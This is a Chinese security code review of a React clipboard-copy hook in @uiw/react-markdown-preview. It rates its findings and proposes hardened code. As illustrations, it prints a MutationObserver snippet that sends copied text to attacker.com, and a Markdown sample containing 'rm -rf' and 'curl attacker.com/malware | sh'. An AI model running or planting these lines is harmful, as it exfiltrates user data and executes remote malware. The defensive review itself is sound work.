# 代码安全专家评审：useCopied.tsx

**文件**: `@uiw/react-markdown-preview/src/plugins/useCopied.tsx`
**依赖**: `@uiw/copy-to-clipboard@1.0.20`
**评审角色**: 代码安全专家（OWASP Top 10 · DOM 安全 · 剪贴板安全 · 前端攻击面分析）
**评审日期**: 2026-05-24
**代码行数**: 36 行（1 个导出 Hook + 1 个模块级辅助函数）
**功能概述**: 自定义 Hook，通过事件委托为 Markdown 预览容器提供代码块一键复制功能
**评审结论**: ⚠️ CONDITIONAL APPROVE — 不存在可直接利用的高危漏洞，但存在多个中等风险的攻击面和废弃 API 依赖

**问题统计**: HIGH × 1 / MEDIUM × 4 / LOW × 3 / INFO × 2

---

## 一、安全上下文分析

### 1.1 攻击面地图

```
┌──────────────────────────────────────────────────────────────────────┐
│                        useCopied.tsx 安全边界                        │
│                                                                      │
│  外部输入（不可信）:                                                   │
│  ┌─────────────────┐                                                 │
│  │ Markdown 源文本  │ ──→ rehypeRewrite → data-code="..."             │
│  │ (用户可控)       │      └── 属性值来自 Markdown 渲染产物            │
│  └─────────────────┘               │                                 │
│                                     ▼                                 │
│  ┌──────────────────────────────────────────────────────────┐        │
│  │                    useCopied Hook                         │        │
│  │                                                           │        │
│  │  事件委托入口 ←── 用户点击（可信来源）                       │        │
│  │       │                                                   │        │
│  │       ▼                                                   │        │
│  │  getParentElement() ←── event.target（半可信）             │        │
│  │       │              └── DOM 元素，受 XSS 保护              │        │
│  │       ▼                                                   │        │
│  │  dataset.code ←── data 属性（不可信 — 来自 Markdown 源文本）│        │
│  │       │                                                   │        │
│  │       ▼                                                   │        │
│  │  copyTextToClipboard() ←── @uiw/copy-to-clipboard         │        │
│  │       │                     └── document.execCommand('copy')│       │
│  │       │                     └── 创建临时 <textarea>         │       │
│  │       ▼                                                   │        │
│  │  系统剪贴板（高价值目标）                                   │        │
│  └──────────────────────────────────────────────────────────┘        │
│                                                                      │
│  信任边界:                                                           │
│  ├── T1: Markdown 源文本 → DOM data 属性（rehypeRewrite 负责转义）    │
│  ├── T2: DOM data 属性 → JavaScript 变量（无校验）                   │
│  ├── T3: JavaScript 变量 → 临时 DOM 元素（copy-to-clipboard 注入）    │
│  └── T4: 临时 DOM 元素 → 系统剪贴板（execCommand 触发浏览器安全策略） │
└──────────────────────────────────────────────────────────────────────┘
```

### 1.2 数据流安全追踪

```
输入: Markdown 源文本（可能包含恶意内容）
  │
  ├── [T1] rehypeRewrite 处理
  │   └── HTML 实体转义 → data-code 属性值
  │       └── 此时 data-code 内容已被 HTML 编码
  │
  ├── [T2] dataset.code 读取
  │   └── 浏览器自动 HTML 解码 → 恢复原始文本
  │       └── ⚠️ 无长度校验、无内容类型校验
  │
  ├── [T3] copyTextToClipboard(text)
  │   └── 创建 <textarea>{text}</textarea>
  │       └── ⚠️ text 作为 textarea.value 赋值（安全，不会被解析为 HTML）
  │
  └── [T4] document.execCommand('copy')
      └── 浏览器剪贴板安全策略控制
          └── 需要用户手势（click 事件）触发 ← 已满足
```

### 1.3 依赖安全审计

| 依赖 | 版本 | 安全状态 |
|------|------|----------|
| `@uiw/copy-to-clipboard` | 1.0.20 | 使用已废弃的 `document.execCommand('copy')` |
| `react` | 项目版本 | `useEffect` + `useRef`，无已知安全问题 |

---

## 二、安全问题详细分析

### S1 — 🟠 HIGH: 依赖废弃 API `document.execCommand('copy')` — 安全隐患与兼容性风险

**严重级别**: 🟠 HIGH
**CVSS 评分**: 5.3 (Medium)
**OWASP 分类**: A06:2021 — Vulnerable and Outdated Components
**CWE**: CWE-477 — Use of Obsolete Function

**现状**:

`@uiw/copy-to-clipboard@1.0.20` 的核心实现：

```javascript
// copy-to-clipboard.esm.js（简化）
function copyTextToClipboard(text, cb) {
  var el = document.createElement('textarea');
  el.value = text;                         // ① 设置文本内容
  el.setAttribute('readonly', '');         // ② 防止移动端键盘弹出
  el.style.left = '-9999px';              // ③ 隐藏到视口外
  document.body.appendChild(el);           // ④ 注入 DOM
  var selected = document.getSelection();  // ⑤ 保存当前选中
  el.select();                             // ⑥ 选中文本
  var success = document.execCommand('copy'); // ⑦ 已废弃的 API
  document.body.removeChild(el);           // ⑧ 移除临时元素
  if (selected) { /* 恢复选中 */ }
  if (cb) cb(success);                     // ⑨ 回调返回成功状态
}
```

**安全问题分析**:

| 风险维度 | 说明 |
|----------|------|
| **API 废弃状态** | `document.execCommand('copy')` 已从 Web 标准中标记为废弃。浏览器供应商在未来版本中可能移除支持，导致功能静默失效 |
| **无错误处理** | `useCopied` 的回调中未检查 `copyTextToClipboard` 的成功/失败状态，始终执行 `classList.add('active')`，给用户虚假的"已复制"反馈 |
| **DOM 注入窗口** | 在步骤④到⑧之间存在一个时间窗口，临时 `<textarea>` 被附加到 `document.body`。虽然 `readonly` + `left:-9999px` 降低了可见性，但该元素可被以下方式探测到：`MutationObserver`、`document.querySelectorAll('textarea')`、全局 DOM 监听器 |
| **焦点劫持** | `el.select()` 会改变当前焦点，可能干扰辅助技术（屏幕阅读器）的用户体验 |
| **异常路径泄漏** | 如果 `document.execCommand('copy')` 与 `removeChild` 之间抛出异常（如页面被导航离开），临时 `<textarea>` 将残留在 DOM 中 |

**攻击场景 — DOM 探测**:

```javascript
// 恶意脚本在同一个页面上下文中运行
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => {
      if (node.nodeName === 'TEXTAREA' && node.style.left === '-9999px') {
        // 捕获用户正在复制的内容
        const stolenContent = node.value;
        // 将窃取的内容发送到攻击者服务器
        fetch('https://attacker.com/exfil', {
          method: 'POST',
          body: stolenContent
        });
      }
    });
  });
});
observer.observe(document.body, { childList: true });
```

**严重性判断**: 此攻击需要恶意脚本已存在于页面上下文中（即已经存在 XSS），此时攻击者已有同等能力直接读取 `data-code` 属性。因此实际可利用性较低，但属于**纵深防御**层面的缺陷。

**修复方案**:

```typescript
// 使用现代 Clipboard API
async function safeCopyToClipboard(text: string): Promise<boolean> {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    // Clipboard API 不可用时降级到 execCommand（仅作 fallback）
    return false;
  }
}
```

---

### S2 — 🟡 MEDIUM: 剪贴板投毒（Clipboard Poisoning）— 未验证的 data-code 内容

**严重级别**: 🟡 MEDIUM
**CVSS 评分**: 4.3
**OWASP 分类**: A01:2021 — Broken Access Control
**CWE**: CWE-20 — Improper Input Validation

**现状**:

```typescript
copyTextToClipboard(target.dataset.code as string, function () {
  setTimeout(() => {
    target.classList.remove('active');
  }, 2000);
});
```

`dataset.code` 直接来自 DOM `data-code` 属性，该属性由 `rehypeRewrite` 插件在 Markdown 渲染过程中注入。内容来源链路：

```
Markdown 源文本（用户输入）
  → rehype/remark 解析
  → code 块提取
  → 写入 data-code 属性
  → useCopied 读取
  → 写入系统剪贴板
```

**攻击场景**:

1. **剪贴板内容替换**: 如果应用接受用户提交的 Markdown 内容（如评论、文章），攻击者可以构造特殊的 Markdown 代码块，其中包含恶意文本（如 shell 命令、URL、配置内容）。当其他用户点击"复制代码"时，剪贴板中的内容可能与用户预期不符。

2. **示例攻击**:

````markdown
```bash
# 看起来是正常的安装命令
npm install useful-package

# 但实际 data-code 可能被注入额外的换行和命令
rm -rf /tmp/important-data
curl https://attacker.com/malware | sh
```
````

如果攻击者能通过 Markdown 注入（如不安全的 HTML 标签）修改 `data-code` 属性的内容，就能将任意文本写入用户剪贴板。

**缓解措施分析**:

| 缓解措施 | 是否存在 | 说明 |
|----------|----------|------|
| Markdown HTML 白名单过滤 | ✅（取决于上游配置） | `rehype-sanitize` 或类似插件可以过滤危险 HTML |
| `data-code` 内容长度限制 | ❌ | 无限制，恶意构造的超大文本可导致剪贴板操作耗时 |
| `data-code` 内容类型校验 | ❌ | 无校验，任何字符串都可被复制 |
| 复制操作用户确认 | ❌ | 无二次确认，一键复制 |

**修复建议**:

```typescript
const MAX_CODE_LENGTH = 100_000; // 100KB 上限

const handle = useCallback((event: Event) => {
  const target = findCopyTarget(event.target);
  if (!target?.dataset.code) return;

  const code = target.dataset.code;
  if (code.length > MAX_CODE_LENGTH) {
    console.warn('Code block exceeds maximum copy length');
    return;
  }

  target.classList.add('active');
  // ...
}, []);
```

---

### S3 — 🟡 MEDIUM: 错误反馈虚假 — 复制失败时仍显示成功状态

**严重级别**: 🟡 MEDIUM
**CVSS 评分**: 3.5
**OWASP 分类**: A04:2021 — Insecure Design
**CWE**: CWE-754 — Improper Check for Unusual or Exceptional Conditions

**现状**:

```typescript
const handle = (event: Event) => {
  const target = getParentElement(event.target);
  if (!target) return;
  target.classList.add('active');                           // ← 无条件显示成功
  copyTextToClipboard(target.dataset.code as string, function () {
    setTimeout(() => {
      target.classList.remove('active');
    }, 2000);
  });
};
```

**问题分析**:

1. `classList.add('active')` 在 `copyTextToClipboard` 之前执行 — 无论复制是否成功都显示"已复制"
2. `copyTextToClipboard` 的回调函数签名是 `(isCopy: boolean) => void`，但 `useCopied` 的回调**完全忽略了这个参数**
3. 在以下场景中，用户会收到虚假的成功反馈：
   - 浏览器不支持 `document.execCommand('copy')`（返回 false）
   - 页面权限策略禁止剪贴板访问
   - 用户拒绝了剪贴板权限（Firefox 的剪贴板权限提示）
   - Firefox 非活动标签页中 `execCommand('copy')` 返回 false

**安全影响**: 用户可能信任"已复制"反馈，在实际未复制成功的情况下：
- 在密码管理器场景中粘贴旧内容到密码字段
- 粘贴错误的代码到生产环境终端
- 粘贴过期的 token 到 API 请求中

**修复建议**:

```typescript
const handle = useCallback((event: Event) => {
  const target = findCopyTarget(event.target);
  if (!target?.dataset.code) return;

  copyTextToClipboard(target.dataset.code, (success) => {
    if (success) {
      target.classList.add('active');
      timeoutRef.current = setTimeout(() => {
        target.classList.remove('active');
      }, COPY_FEEDBACK_DURATION);
    } else {
      target.classList.add('copy-failed');
      timeoutRef.current = setTimeout(() => {
        target.classList.remove('copy-failed');
      }, 2000);
    }
  });
}, []);
```

---

### S4 — 🟡 MEDIUM: DOM 元素类型未校验 — `target as HTMLElement` 不安全断言

**严重级别**: 🟡 MEDIUM
**CVSS 评分**: 3.7
**CWE**: CWE-843 — Access of Resource Using Incompatible Type

**现状**:

```typescript
function getParentElement(target: EventTarget | null): null | HTMLElement {
  if (!target) return null;
  const dom = target as HTMLElement;           // ← 不安全断言
  if (dom.dataset.code && dom.classList.contains('copied')) {
    return dom;
  }
  if (dom.parentElement) {
    return getParentElement(dom.parentElement);
  }
  return null;
}
```

**问题分析**:

`EventTarget` 可能是以下类型之一：
- `HTMLElement` — 正常情况
- `TextNode` — 点击了文本节点（`event.target` 可以是 Text 节点）
- `SVGElement` — 嵌入了 SVG 内容
- `ShadowRoot` — Web Components 场景

当 `target` 是 `TextNode` 时：
- `dom.dataset` → `undefined`（TextNode 没有 dataset 属性）
- `dom.classList` → `undefined`
- `dom.parentElement` → 父 HTMLElement

在 JavaScript 中访问 `undefined` 的属性会抛出 `TypeError`，但由于：
- `dom.dataset.code` 使用短路求值，`dom.dataset` 为 `undefined` 时整个条件为 `false`
- 实际上不会崩溃，因为 `undefined.code` 是 `undefined`（falsy），不会抛异常

**但是**：这依赖于 JavaScript 的 short-circuit 语义，属于**偶然安全**而非**设计安全**。TypeScript 编译器无法捕获此问题，因为 `as HTMLElement` 绕过了类型检查。

**修复建议**:

```typescript
function findCopyTarget(target: EventTarget | null): HTMLElement | null {
  if (!(target instanceof HTMLElement)) return null;
  return target.closest<HTMLElement>('.copied[data-code]');
}
```

`instanceof` 类型守卫在运行时验证类型，同时让 TypeScript 编译器正确收窄类型。

---

### S5 — 🟡 MEDIUM: 临时 DOM 元素未做安全防护 — `copy-to-clipboard` 的 textarea 注入

**严重级别**: 🟡 MEDIUM
**CVSS 评分**: 3.1
**CWE**: CWE-74 — Improper Neutralization of Special Elements in Output

**现状**:

`@uiw/copy-to-clipboard` 在复制过程中创建临时 `<textarea>` 元素：

```javascript
var el = document.createElement('textarea');
el.value = text;                    // text 来自 dataset.code
el.setAttribute('readonly', '');
el.style.left = '-9999px';
document.body.appendChild(el);      // ← 注入到 DOM
el.select();
document.execCommand('copy');
document.body.removeChild(el);
```

**安全分析**:

| 防护措施 | 是否实施 | 说明 |
|----------|----------|------|
| `el.value = text` | ✅ | `textarea.value` 赋值是安全的，不会执行 HTML |
| `readonly` 属性 | ✅ | 防止移动端键盘弹出，但不妨碍 DOM 读取 |
| `left: -9999px` | ✅ | 视觉隐藏，但**不防 DOM 探测** |
| 隐藏属性（`display:none`） | ❌ | 未使用，`display:none` 会导致 `select()` 失败 |
| `aria-hidden="true"` | ❌ | 未设置，临时元素对屏幕阅读器可见 |
| CSP nonce/style-hash | ❌ | 临时元素的 `style` 属性可能违反严格的 CSP 策略 |

**风险场景**:

1. **严格 CSP 环境**: 如果应用配置了 `style-src 'self'`（不允许 inline style），`el.style.left = '-9999px'` 可能被浏览器拒绝，导致临时 `<textarea>` 在页面左上角短暂可见，泄露正在复制的代码内容。

2. **屏幕阅读器干扰**: 临时 `<textarea>` 未设置 `aria-hidden="true"`，屏幕阅读器用户可能听到短暂的文本内容朗读，影响可访问性。

---

### S6 — 🟢 LOW: 递归遍历无深度限制 — 潜在栈溢出

**严重级别**: 🟢 LOW
**CWE**: CWE-400 — Uncontrolled Resource Consumption

**现状**:

```typescript
function getParentElement(target: EventTarget | null): null | HTMLElement {
  if (!target) return null;
  const dom = target as HTMLElement;
  if (dom.dataset.code && dom.classList.contains('copied')) {
    return dom;
  }
  if (dom.parentElement) {
    return getParentElement(dom.parentElement);  // ← 无深度限制的递归
  }
  return null;
}
```

**分析**: 正常 DOM 树深度有限（通常 < 100 层），递归栈溢出的可能性极低。但如果页面中存在恶意构造的超深嵌套 DOM（如通过 innerHTML 注入），理论上可以触发栈溢出。在现代浏览器中，`document.body.parentElement.parentElement` 到 `html` 元素即终止，因此实际风险可忽略。

---

### S7 — 🟢 LOW: 事件监听器未标记 `passive` 或 `capture` 的安全考量

**严重级别**: 🟢 LOW

**现状**:

```typescript
container.current?.addEventListener('click', handle, false);
```

第三个参数 `false` 表示冒泡阶段监听。在安全上下文中：
- 冒泡阶段的事件可以被任何子元素的事件处理器的 `stopPropagation()` 阻止
- 这意味着如果 Markdown 内容中嵌入的第三方脚本调用了 `event.stopPropagation()`，复制功能将静默失效
- 这不是直接的安全漏洞，但属于**拒绝服务**层面的设计考量

---

### S8 — 🟢 LOW: `data-code` 属性值可能包含敏感信息

**严重级别**: 🟢 LOW
**CWE**: CWE-200 — Exposure of Sensitive Information

**现状**: Markdown 代码块的全部源文本以 `data-code` 属性的形式存储在 DOM 中。这意味着：

1. **DOM 检查**: 任何能在页面中执行 JavaScript 的代码都可以通过 `document.querySelectorAll('[data-code]')` 读取所有代码块内容
2. **浏览器扩展**: 恶意浏览器扩展可以扫描 DOM 中的 `data-code` 属性
3. **开发者工具**: 用户可以通过 F12 直接看到完整的代码内容（包括可能被 CSS 隐藏的代码块）

**影响**: 在本项目中，Markdown 内容通常是文章和知识库内容，不涉及敏感凭据。但如果未来用于展示包含密钥、token 的代码，需要注意此攻击面。

---

### I1 — ℹ️ INFO: `setTimeout` 无 cleanup — 跨生命周期副作用

**与安全评审的关联度**: 间接相关（资源管理）

虽然这主要是一个架构问题（在架构评审 A2 中已详述），但从安全角度看：
- 组件卸载后操作已脱离 DOM 树的元素，在大多数情况下是无害的（classList 操作是非破坏性的）
- 但在极端情况下（如目标元素被重用到另一个组件），可能产生**非预期的 CSS 状态变更**

---

### I2 — ℹ️ INFO: 快速连续点击的状态竞争

**与安全评审的关联度**: 间接相关（完整性）

```
时间线:
  t=0ms     用户点击 → add('active') → setTimeout(2000ms)
  t=100ms   用户再次点击 → add('active') → setTimeout(2000ms)
  t=2000ms  第一个 timeout 触发 → remove('active')
  t=2100ms  第二个 timeout 触发 → remove('active')（已经无 active）

结果: 复制反馈在 2 秒时就消失，而不是预期的 2.1 秒。
```

这不会导致安全问题，但影响用户体验的完整性。如果复制操作涉及权限敏感操作，状态竞争可能导致不一致的安全状态。

---

## 三、安全评分

| 维度 | 评分 (1-10) | 说明 |
|------|-------------|------|
| **输入验证** | 3 | `dataset.code` 无长度限制、无内容校验 |
| **依赖安全** | 4 | 使用已废弃的 `document.execCommand`，无已知 CVE 但存在废弃风险 |
| **错误处理** | 2 | 完全忽略复制失败状态，始终显示成功反馈 |
| **类型安全** | 4 | `as HTMLElement` 不安全断言，依赖 JavaScript 短路语义的偶然安全 |
| **DOM 操作安全** | 5 | 事件委托模式合理，但递归遍历和 DOM 注入存在改进空间 |
| **信息泄露防护** | 5 | `data-code` 明文存储在 DOM 中，但属于功能设计的固有取舍 |
| **纵深防御** | 3 | 缺少多层安全防护（无长度限制、无失败反馈、无 CSP 考量） |
| **综合安全评分** | **3.7 / 10** | |

---

## 四、对本项目（by_geo）的安全影响评估

### 4.1 威胁建模

| 威胁 | 攻击向量 | 前提条件 | 本项目风险 | 严重程度 |
|------|----------|----------|-----------|----------|
| 剪贴板投毒 | Markdown 注入修改 data-code | 攻击者能提交恶意 Markdown | **低** — 知识库 Markdown 通常由管理员编辑 | 🟡 |
| DOM 探测剪贴板内容 | MutationObserver 监听临时 textarea | 页面已存在 XSS | **极低** — 有 XSS 时攻击者可直接读 data-code | 🟢 |
| 虚假复制反馈 | 浏览器兼容性导致 execCommand 失败 | 用户使用旧浏览器或严格权限策略 | **中** — 用户可能信任虚假反馈 | 🟡 |
| CSP 冲突 | 严格 CSP 阻止 inline style | 应用启用严格 CSP 策略 | **低** — 本项目未启用严格 CSP | 🟢 |
| 废弃 API 未来失效 | 浏览器移除 execCommand 支持 | 浏览器版本升级 | **中** — 功能静默失效 | 🟡 |

### 4.2 本项目的安全上下文

```
by_geo 项目安全态势:
├── Markdown 内容来源: 管理员编辑（信任级别高）
├── 知识库访问权限: 需要登录（认证保护）
├── Markdown 渲染: @uiw/react-markdown-preview（内置 rehype 处理）
├── CSP 策略: 未启用严格 CSP（ Helmet 中等配置）
└── 剪贴板使用场景: 代码示例复制（低敏感度）
```

### 4.3 风险接受建议

| 项目 | 决策 | 理由 |
|------|------|------|
| 剪贴板投毒 | **接受** | Markdown 内容由管理员控制，攻击面极小 |
| 废弃 API 风险 | **监控** | 关注 `@uiw/react-markdown-preview` 更新，未来迁移到 Clipboard API |
| 虚假反馈 | **接受** | 当前版本浏览器兼容性良好，短期不会影响用户体验 |

---

## 五、安全加固建议（按优先级排序）

### 优先级 P0（推荐立即实施）

无。当前不存在可直接利用的高危漏洞。

### 优先级 P1（建议在下一个维护窗口实施）

| 编号 | 建议 | 收益 |
|------|------|------|
| S1-修复 | 升级到使用 Clipboard API 的复制方案 | 消除废弃 API 依赖，提升安全性 |
| S3-修复 | 检查 `copyTextToClipboard` 回调的成功状态 | 消除虚假反馈 |

### 优先级 P2（建议在功能迭代时实施）

| 编号 | 建议 | 收益 |
|------|------|------|
| S2-修复 | 为 `dataset.code` 添加长度限制 | 防止超长内容影响剪贴板性能 |
| S4-修复 | 使用 `instanceof HTMLElement` + `closest()` | 消除不安全断言，提升类型安全 |
| S5-修复 | 为临时 DOM 元素添加 `aria-hidden` | 提升可访问性 |

### 优先级 P3（可选增强）

| 编号 | 建议 | 收益 |
|------|------|------|
| S6 | 用 `closest()` 替代递归遍历 | 消除理论上的栈溢出风险 |
| S8 | 评估是否需要对敏感代码块禁用 `data-code` | 减少信息泄露攻击面 |

---

## 六、安全加固后的完整代码

```typescript
import copyTextToClipboard from '@uiw/copy-to-clipboard';
import { useCallback, useEffect, useRef } from 'react';

const COPY_FEEDBACK_DURATION = 2000;
const MAX_COPY_LENGTH = 100_000; // 100KB 上限

function findCopyTarget(target: EventTarget | null): HTMLElement | null {
  if (!(target instanceof HTMLElement)) return null;
  return target.closest<HTMLElement>('.copied[data-code]');
}

export function useCopied(container: React.RefObject<HTMLDivElement>) {
  const timeoutRef = useRef<ReturnType<typeof setTimeout>>();

  const handle = useCallback((event: Event) => {
    const target = findCopyTarget(event.target);
    if (!target?.dataset.code) return;

    const code = target.dataset.code;
    if (code.length > MAX_COPY_LENGTH) return;

    clearTimeout(timeoutRef.current);
    copyTextToClipboard(code, (success) => {
      if (success) {
        target.classList.add('active');
      } else {
        target.classList.add('copy-failed');
      }
      timeoutRef.current = setTimeout(() => {
        target.classList.remove('active');
        target.classList.remove('copy-failed');
      }, COPY_FEEDBACK_DURATION);
    });
  }, []);

  useEffect(() => {
    const el = container.current;
    if (!el) return;
    el.addEventListener('click', handle, false);
    return () => {
      el.removeEventListener('click', handle, false);
      clearTimeout(timeoutRef.current);
    };
  }, [container, handle]);
}
```

**加固要点**:

| 变更 | 解决的问题 | 安全收益 |
|------|-----------|----------|
| `instanceof HTMLElement` 类型守卫 | S4 | 消除不安全断言 |
| `closest()` 替代递归 | S6 | 消除栈溢出风险 |
| `dataset.code` null 检查 | S4 | 防止 undefined 写入剪贴板 |
| `code.length > MAX_COPY_LENGTH` | S2 | 防止超长内容攻击 |
| `success` 参数检查 | S3 | 消除虚假反馈 |
| `copy-failed` CSS 类 | S3 | 提供失败视觉反馈 |
| `timeoutRef` + cleanup | I1 | 消除跨生命周期副作用 |
| `clearTimeout` 在复制前 | I2 | 防止快速点击的状态竞争 |

---

## 七、总结

### 核心安全发现

`useCopied.tsx` 是一个 36 行的自定义 Hook，整体安全态势**中等偏下**。不存在可直接利用的高危漏洞，但存在以下值得关注的安全问题：

1. **废弃 API 依赖**（S1）：底层 `@uiw/copy-to-clipboard` 使用已废弃的 `document.execCommand('copy')`，存在兼容性风险和 DOM 注入窗口
2. **虚假成功反馈**（S3）：复制失败时仍显示"已复制"状态，属于安全设计缺陷
3. **输入未校验**（S2）：`data-code` 属性值无长度限制，理论上可被滥用

### 纵深防御建议

```
当前防御层:                          建议增强:

┌─────────────────┐                 ┌─────────────────┐
│ rehype HTML 转义 │                 │ rehype HTML 转义 │ ← 现有
│        │         │                 │        │         │
│        ▼         │                 │        ▼         │
│ dataset.code     │                 │ 内容长度校验     │ ← 新增 S2
│        │         │                 │        │         │
│        ▼         │   ──→          │        ▼         │
│ copy-to-clipboard│                 │ Clipboard API   │ ← 新增 S1
│ (execCommand)    │                 │        │         │
│        │         │                 │        ▼         │
│ 始终显示成功     │                 │ 成功/失败反馈   │ ← 新增 S3
└─────────────────┘                 └─────────────────┘
```

### 与架构评审的交叉引用

| 安全问题 | 对应架构问题 | 关联说明 |
|----------|-------------|----------|
| S1 废弃 API | — | 纯安全层面，架构评审未涉及 |
| S2 剪贴板投毒 | A5 隐式契约 | 均涉及 data-code 的信任链 |
| S3 虚假反馈 | — | 安全设计缺陷 |
| S4 类型断言 | A7 类型安全 | 同一根源问题 |
| S5 DOM 注入 | A2 定时器泄漏 | 均涉及跨生命周期的资源管理 |
| I1 setTimeout | A2 定时器泄漏 | 完全相同的问题，不同视角 |

### 最终建议

在本项目的当前安全上下文中（管理员控制 Markdown 内容、需要认证才能访问），`useCopied` 的安全风险**可接受**。建议：
- **短期**: 无需紧急修复
- **中期**: 关注 `@uiw/react-markdown-preview` 库更新，优先解决废弃 API 依赖
- **长期**: 如果项目引入用户提交 Markdown 的功能，需要重新评估剪贴板投毒风险
